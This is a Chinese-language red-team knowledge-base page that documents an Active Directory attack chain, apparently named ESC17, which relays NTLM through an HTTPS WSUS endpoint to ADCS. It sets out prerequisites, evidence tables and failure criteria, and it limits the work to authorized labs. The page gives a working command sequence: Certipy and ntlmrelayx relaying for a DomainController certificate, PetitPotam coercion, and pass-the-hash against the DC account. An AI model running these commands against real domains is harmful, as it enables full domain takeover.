# 2026 战例：ESC17 — ADCS 经 HTTPS WSUS 中继

> 战例 KB-AD-2026-04 · 收录 2026-10-20 · 单篇 ≤200 行 · 只写链路、字段与判据，不复述 ESC1–ESC8。

## 来源与日期

- Troopers 2026 议题（2026-03）：把 WSUS 的 HTTPS 端点当作 NTLM 中继落点，再转 ADCS Web Enrollment。
- hack.lu 2026 议题（2026-10）：ESC17 命名与条件收敛，强调 `WSUS` 的 `ServerUrl` 可由 GPO/注册表控制。
- 关联公开工具：Certipy（`find`/`relay`/`auth`）、impacket `ntlmrelayx`、`Responder`/`PetitPotam` 系强制认证。
- 本页为会议材料蒸馏，未附域内复现；所有命令必须在授权实验室执行。

## 场景

成立前提（缺一条即不成立，先逐条核）：

1. 目标域内存在 ADCS，且 Web Enrollment（`/certsrv/`）或 CES 可被 NTLM 认证。
2. WSUS 配置为 **HTTPS**，客户端信任的证书链可被攻击者控制（企业 CA 误签 / 私建 CA 入信任 /
   代理 TLS 终止），否则中继拿不到明文 HTTP 认证。
3. 能把某台机器的认证“推”到 WSUS 端点（GPO `WUServer` 可改、或已有强制认证原语）。
4. 中继账号对目标模板有 `Enroll` 权限，且模板允许 `Client Authentication`/`Any Purpose`。

链路（`esc17_chain` 的顺序就是判据顺序）：

```text
改 WUServer/WUStatusServer → 触发 wuauclt/gpupdate 认证
→ NTLM 落到 HTTPS WSUS 终结器（TLS 由我方证书终止）
→ 中继到 ADCS Web Enrollment（HTTP/NTLM）
→ 领取证书 → PKINIT → TGT → 域内权限
```

## 命令

```bash
# 0) 只读枚举：ADCS 模板 + WSUS 配置 + 中继可行性
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
nxc smb "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol
reg query 'HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' /s   # 在授权主机上
nxc ldap "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN" -M groupmembership

# 1) 证书面：确认 HTTPS 终结证书被客户端信任（只看信任链，不做拦截）
openssl s_client -connect wsus.corp.local:8531 -servername wsus.corp.local \
  -showcerts </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates

# 2) 中继（实验室）：TLS 终结后转 ADCS
#    certipy relay 负责 WSUS/HTTPS 侧，ntlmrelayx 负责 ADCS 侧，二者只选其一
certipy relay -target https://wsus.corp.local:8531 -template DomainController \
  -ca "$CA" -dc-ip "$DC"
# 或：
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# 3) 强制认证（只对授权主机；单次、可回滚）
python3 PetitPotam.py -u "$USER" -p "$PASS" -d "$DOMAIN" "$LISTENER" "$TARGET"

# 4) 证书→票据→权限见证
certipy auth -pfx dc.pfx -dc-ip "$DC"
nxc smb "$DC" -u 'DC$' -H "$NTHASH" -d "$DOMAIN" --shares
```

## 判据表

| 字段 | 取值 | 成立阈值 | 证据 |
| :-- | :-- | :-- | :-- |
| `wsus_https` | `true/false` + 端口（8531/443） | `true` 需同时满足：端点仅 HTTPS、证书链被客户端信任、`WUServer` 指向该主机 | `s_client` 输出 + GPO 值 |
| `esc17_chain` | 有序数组，如 `["gpo-wuserver","coerce","tls-terminate","relay-adcs","cert-issue","pkinit"]` | 6 段齐全且每段有时间戳/rc；缺段即 `partial` | `chain.json` |
| `relay_target` | `adcs-web` / `ldap` / `ldaps` | 必须与 `esc17_chain` 中实际落点一致 | 中继日志 |
| `cert_template` | 模板名 + `enroll` 权限主体 | 中继身份对该模板有 Enroll，且 `EKUs` 含客户端认证 | `certipy find` JSON |
| `cert_issued` | `true` + Serial/Thumbprint | 证书由目标 CA 签发（Issuer 匹配），非自签 | `.pfx` + `certipy auth` |
| `pkinit_tgt` | `true` + 票据稀疏字段 | `certipy auth` 返回 TGT，且 `whoami`/`--shares` 证明权限级别 | 票据缓存 + 命令输出 |
| `coerce_primitive` | `petitpotam` / `printerbug` / `gpo` | 单次触发即产生 4624/认证日志，无需反复刷 | DC 侧事件 + 时间戳 |
| `rollback` | 变更项与还原命令 | WUServer/注册表变更前后有快照，实验后已还原 | `before.reg`/`after.reg` |

`esc17_chain` 里的每一段都必须能单独失败复现（关掉 TLS 终结、关掉中继、撤销模板权限各一次），
否则只是“环境恰好通了”，不算链路成立。

## 失败判据

- `wsus_https=true` 但证书链不被信任（客户端报 0x80072F8F/证书错误）→ TLS 终止不成立，链断在第 3 段。
- WSUS 仅 HTTP（8530）→ 不属于 ESC17，按 ESC8 同类但走明文，另行判定。
- 中继日志显示 `Authenticating against ... FAILED`，或只有 `LOGON_FAILED` → 落点不支持 NTLM 或已禁 relay。
- 拿到证书但 `certipy auth` 报 `KDC_ERR_PADATA_TYPE_NOSUPPORT` → 模板缺客户端认证 EKU，降级。
- 证书 Issuer 不是目标企业 CA，或 Serial 在 CA 日志里查不到 → 证书来源不明，判否。
- 只能拿到 `candidate`（有模板、无中继证据）→ 不写“ESC17 成立”，写“前置条件满足”。
- 强制认证导致目标蓝屏/服务中断、或需重复高频触发 → 立即停，越界与丢证。
- 变更 GPO/注册表未还原 → 证据链与授权均失效，作废本次结论。

> 边界：不做未授权的 WSUS 拦截；TLS 终结仅在实验室自有网段；域内主机变更须有书面授权与回滚脚本；
> `wsus_https` 的信任链判定只读证书，不导入根证书、不改客户端信任存储。

## 与 reference 的关系

- ADCS 条件与 ESC 决策：[kerberos-and-adcs.md](../../../../../../../Tool/skill/_pending/ad-cloud/references/kerberos-and-adcs.md)、
  [05-adcs-esc-decision.md](05-adcs-esc-decision.md)（ESC1–ESC8 口径，本页只补 ESC17 的 WSUS 前缀）。
- 中继与委派：[ad-attacks.md](../../../../../../../Tool/skill/_pending/ad-cloud/references/ad-attacks.md)。
- 失败判据：[02-failure-criteria.md](../../../../../../../Tool/skill/_pending/ad-cloud/references/02-failure-criteria.md)。
- 同 board 邻近篇：[01-kerberos-and-adcs.md](01-kerberos-and-adcs.md)、[04-kerberos-paths.md](04-kerberos-paths.md)、
  [07-failure-criteria.md](07-failure-criteria.md)。
